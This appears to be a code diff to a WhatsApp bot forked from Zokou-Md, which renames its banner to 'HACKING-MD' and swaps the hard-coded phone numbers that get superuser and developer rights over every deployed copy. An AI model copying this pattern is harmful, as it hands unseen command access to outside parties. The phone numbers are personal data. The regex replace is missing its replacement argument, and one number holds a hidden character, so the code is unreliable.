@@ -136,9 +136,9 @@
                 var origineMessage = ms.key.remoteJid;
                 var idBot = decodeJid(zk.user.id);
                 var servBot = idBot.split('@')[0];
-                /* const dj='22545065189';
-                 const dj2='2250545065189';
-                 const luffy='22588697148'*/
+                /* const dj='2250705607226';
+                 const dj2='2250507646665';
+                 const luffy='0705607226'*/
                 /*  var superUser=[servBot,dj,dj2,luffy].map((s)=>s.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);
                   var dev =[dj,dj2,luffy].map((t)=>t.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);*/
                 const verifGroupe = origineMessage?.endsWith("@g.us");
@@ -158,11 +158,11 @@
                 var membreGroupe = verifGroupe ? ms.key.participant : '';
                 const { getAllSudoNumbers } = require("./bdd/sudo");
                 const nomAuteurMessage = ms.pushName;
-                const dj = '22545065189';
-                const dj2 = '22545065189';
+                const dj = '2250507646665';
+                const dj2 = '22507607126';
                 const dj3 = "2250507646665";
                 const luffy = '2250507646665';
-                const dj4 = '‪88697148';
+                const dj4 = '‪0705607226';
                 const sudo = await getAllSudoNumbers();
                 const superUserNumbers = [servBot, dj, dj2, dj3,dj4, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
                 const allAllowedNumbers = superUserNumbers.concat(sudo);
@@ -170,7 +170,7 @@
                 
                 var dev = [dj, dj2,dj3,dj4,luffy].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
                 function repondre(mes) { zk.sendMessage(origineMessage, { text: mes }, { quoted: ms }); }
-                console.log("\t [][]...{Zokou-Md}...[][]");
+                console.log("\t [][]...{HACKING-MD}...[][]");
                 console.log("=========== Nouveau message ===========");
                 if (verifGroupe) {
                     console.log("message provenant du groupe : " + nomGroupe);
